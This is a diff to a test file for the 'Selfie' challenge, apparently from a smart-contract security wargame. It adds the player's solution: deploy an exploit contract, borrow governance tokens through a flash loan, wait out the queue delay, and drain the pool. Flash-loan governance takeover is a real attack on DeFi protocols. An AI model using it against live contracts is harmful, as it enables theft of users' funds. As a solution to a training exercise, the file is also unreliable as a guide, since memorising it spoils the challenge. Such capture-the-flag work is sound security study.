@@ -38,7 +38,16 @@ describe('[Challenge] Selfie', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // Abuse flashloan to get the governance votes
+        // The target uses the same token for both liquidity and governance
+
+        Exploit = await (await ethers.getContractFactory('ExploitSelfie', player)).deploy(token.address, pool.address, governance.address, player.address);
+        await Exploit.exploit();
+
+        // Need to wait at least 2 days after queuing the action to execute it
+        await ethers.provider.send("evm_increaseTime", [3 * 24 * 60 * 60]); // 3 days
+
+        await Exploit.yoink();
     });
 
     after(async function () {
